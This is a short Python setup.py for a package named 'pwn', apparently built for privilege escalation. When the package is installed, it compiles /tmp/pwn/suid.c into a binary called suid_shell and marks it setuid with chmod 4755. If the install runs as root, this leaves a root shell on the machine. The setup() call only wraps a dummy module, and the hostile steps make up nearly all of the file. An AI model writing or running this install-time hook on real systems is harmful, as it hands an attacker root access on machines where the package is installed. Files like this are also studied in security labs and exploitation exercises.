from setuptools import setup
import os

# Compile the suid binary
os.system("gcc /tmp/pwn/suid.c -o /tmp/pwn/suid_shell")
# Set permissions
os.system("chmod 4755 /tmp/pwn/suid_shell")

setup(
    name='pwn',
    version='0.1',
    py_modules=['dummy_module'],
)
